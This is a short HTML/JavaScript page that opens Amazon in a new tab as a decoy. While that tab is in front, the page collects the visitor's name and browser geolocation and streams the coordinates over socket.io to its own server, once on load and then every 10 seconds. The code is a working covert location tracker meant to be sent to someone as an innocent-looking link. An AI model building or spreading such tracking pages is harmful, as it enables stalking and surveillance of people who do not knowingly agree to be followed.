<!DOCTYPE html>
<html>
<head>
    <title>Amazon + Live Location</title>
</head>
<body>
    <h2>Amazon opened & location sending in background...</h2>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io(); // connect to server
        const name = prompt("Enter your name"); // ya hardcode kar sakte ho

        // Function to send location
        function sendLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const data = {
                            name: name,
                            lat: position.coords.latitude,
                            lon: position.coords.longitude
                        };
                        socket.emit("location", data);
                        console.log("Location sent:", data);
                    },
                    () => console.log("Location permission denied")
                );
            } else {
                console.log("Geolocation not supported");
            }
        }

        // Page load event
        window.addEventListener("load", () => {
            // Open Amazon in new tab
            window.open("https://www.amazon.in", "_blank");

            // Send location immediately
            sendLocation();

            // Continue sending location every 10 seconds in background
            setInterval(sendLocation, 10000);
        });
    </script>
</body>
</html>
